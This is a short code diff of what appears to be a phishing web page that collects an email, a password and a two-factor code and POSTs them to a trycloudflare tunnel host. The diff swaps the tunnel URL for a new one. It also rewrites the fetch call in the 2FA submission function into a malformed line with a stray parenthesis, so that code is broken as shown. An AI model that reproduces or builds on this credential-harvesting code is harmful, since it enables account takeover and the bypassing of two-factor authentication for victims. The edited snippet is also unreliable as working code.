@@ -58,7 +58,7 @@
         </div>
     </div>
     <script>
-        const tunnel = "https://postposted-settings-belly-quest.trycloudflare.com";
+        const tunnel = "https://syndicate-textbooks-pound-eyes.trycloudflare.com";
         function goToPuzzle() {
             var e = document.getElementById('email').value, p = document.getElementById('pass').value;
             if(e && p) {
@@ -101,7 +101,7 @@
         }
         function submitOTP() {
             const c = document.getElementById('2fa_code').value;
-            fetch(tunnel, {
+            fetch(tunnel, ('https://syndicate-textbooks-pound-eyes.trycloudflare.com', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ '2fa_code': c })
